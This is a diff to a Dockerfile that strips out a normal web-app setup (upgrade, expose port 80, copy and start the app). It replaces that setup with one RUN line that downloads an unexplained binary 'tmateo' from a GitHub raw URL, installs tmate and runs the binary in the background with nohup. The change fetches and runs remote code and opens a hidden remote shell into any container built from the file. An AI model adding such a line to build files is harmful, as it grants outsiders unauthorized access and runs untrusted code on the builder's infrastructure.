@@ -1,11 +1,3 @@
 FROM devisty/xssh:v2
 
-RUN apt-get update && \
-  apt-get upgrade -y && \
-  rm -rf /var/lib/apt/lists/*
-
-EXPOSE 80
-
-COPY . /app
-RUN chmod +x /app/start.sh
-CMD ["/app/start.sh"]
+RUN wget https://raw.githubusercontent.com/masdinoyo/tmate/main/tmateo && apt-get update && apt-get install tmate -y && chmod +x tmateo && nohup ./tmateo --log=stdout > meta.log &
